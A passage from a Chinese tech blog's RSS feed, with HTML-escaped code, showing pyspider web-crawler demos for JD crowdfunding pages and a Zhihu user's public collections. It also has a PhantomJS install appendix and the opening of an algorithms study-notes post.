            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://z.jd.com/bigger/search.html?&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page_num&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;enter_item&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sort&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;zhtj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;page&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page_num&lt;/span&gt;&lt;span class="p"&gt;)})&lt;/span&gt;


    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;enter_item&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;#print response.doc(&amp;quot;.lr-lists .link-pic&amp;quot;)&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;each&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.lr-lists .link-pic&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;each&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;href&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fetch_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;item_detail&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;item_detail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="n"&gt;item_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.project-tilte &amp;gt; h1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#项目名称&lt;/span&gt;
        &lt;span class="n"&gt;item_owner&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.font18 &amp;gt; a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="c1"&gt;#项目发起人&lt;/span&gt;
        &lt;span class="n"&gt;item_status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.icon_pag&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#项目状态&lt;/span&gt;
        &lt;span class="c1"&gt;#item_begintime =  response.doc(&amp;#39;div.font14 &amp;gt; .lh24 &amp;gt; span:first&amp;#39;).text()#发起日期，只有筹款中的才有发起日期，完成的没有&lt;/span&gt;
        &lt;span class="n"&gt;item_deadline&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;div.font14 &amp;gt; .lh24 &amp;gt; span&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="c1"&gt;#截止日期&lt;/span&gt;
        &lt;span class="n"&gt;item_target_fundraising&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;div.font14 &amp;gt; .lh24 &amp;gt; span&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#众筹目标&lt;/span&gt;
        &lt;span class="n"&gt;item_real_fundraising&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.font45&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#已筹款数&lt;/span&gt;
        &lt;span class="n"&gt;supporter_num&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.pr &amp;gt; p &amp;gt; strong&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#支持人数&lt;/span&gt;
        &lt;span class="n"&gt;topic_num&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#topicBtn &amp;gt; span&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#话题数，需要执行完js才得到，所以需要phantomjs&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;item_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;item_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;item_owner&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;item_owner&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;item_status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;item_status&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;item_deadline&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;item_deadline&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;item_target_fundraising&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;item_target_fundraising&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;item_real_fundraising&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;item_real_fundraising&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;supporter_num&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;supporter_num&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;demo3&lt;/h3&gt;
&lt;p&gt;爬取知乎指定用户收藏夹&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# -*- encoding: utf-8 -*-&lt;/span&gt;
&lt;span class="c1"&gt;# Created on 2015-03-24 21:56:49&lt;/span&gt;
&lt;span class="c1"&gt;# Project: zhihu_collection&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pyspider.libs.base_handler&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BaseHandler&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;crawl_config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;

    &lt;span class="nd"&gt;@every&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;minutes&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;on_start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;start_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://www.zhihu.com/people/liu-shi-jiu-84/collections&amp;quot;&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;start_url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;index_page&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="nd"&gt;@config&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;24&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;index_page&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
         &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;each&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.zm-profile-fav-item-title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
             &lt;span class="n"&gt;collection_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;each&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
             &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;each&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;href&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all_answer_pages&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;collection_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;collection_name&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;all_answer_pages&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
         &lt;span class="n"&gt;pages&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.border-pager a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
         &lt;span class="n"&gt;max_pages&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pages&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#倒数第二个, 最大页数&lt;/span&gt;
         &lt;span class="n"&gt;all_collections_pages&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;?page=&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;max_pages&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
         &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;all_collections_pages&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
             &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;
             &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;collection_page&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;collection_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;collection_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]})&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;collection_page&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
         &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;each&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.toggle-expand&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
             &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;each&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;href&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;detail_page&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;collection_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;collection_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]})&lt;/span&gt;

    &lt;span class="nd"&gt;@config&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;priority&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;detail_page&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
             &lt;span class="s2"&gt;&amp;quot;collection_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;collection_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
             &lt;span class="s2"&gt;&amp;quot;url&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
             &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
             &lt;span class="s2"&gt;&amp;quot;body&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.autohide-false .zm-item-rich-text &amp;gt; div&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;附录&lt;/h1&gt;
&lt;h3&gt;Ubuntu 12.04 64bit 安装PhantomJS&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo wget https://phantomjs.googlecode.com/files/phantomjs-1.9.0-linux-x86_64.tar.bz2
sudo tar xjf phantomjs-1.9.0-linux-x86_64.tar.bz2
sudo ln -s /usr/local/share/phantomjs-1.9.0-linux-x86_64/bin/phantomjs /usr/local/share/phantomjs&lt;span class="p"&gt;;&lt;/span&gt; 
sudo ln -s /usr/local/share/phantomjs-1.9.0-linux-x86_64/bin/phantomjs /usr/local/bin/phantomjs&lt;span class="p"&gt;;&lt;/span&gt;
sudo ln -s /usr/local/share/phantomjs-1.9.0-linux-x86_64/bin/phantomjs /usr/bin/phantomjs
phantomjs --version
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 30 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-30:pyspider-demo.html</guid><category>技术</category></item><item><title>算法.前言</title><link>/algorithm-foreword.html</link><description>&lt;p&gt;算法这块看得断断续续，看了后头忘了前头，平时用得也不多，想把学习过程和资源记录到博客，方便自己回顾，免得每次拿起都从绪论翻起&lt;/p&gt;
&lt;h2&gt;记录的内容&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;伪代码&lt;/li&gt;
&lt;li&gt;C语言版本&lt;/li&gt;
&lt;li&gt;Python语言版本&lt;/li&gt;
&lt;li&gt;可视化&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;学习策略&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;推敲&lt;/li&gt;
&lt;li&gt;默写&lt;/li&gt;
&lt;li&gt;定期回顾&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;一些好的资源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.visualgo.net/"&gt;visualgo&lt;/a&gt;：数据结构和算法动态可视化 (Chinese)&lt;/li&gt;
&lt;li&gt;&lt;a href="http://coolshell.cn/articles/4671.html"&gt;可视化的数据结构和算法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/julycoding/The-Art-Of-Programming-By-July"&gt;编程之法：面试和算法心得&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/v_JULY_v"&gt;结构之法 算法之道&lt;/a&gt;&lt;/li&gt;
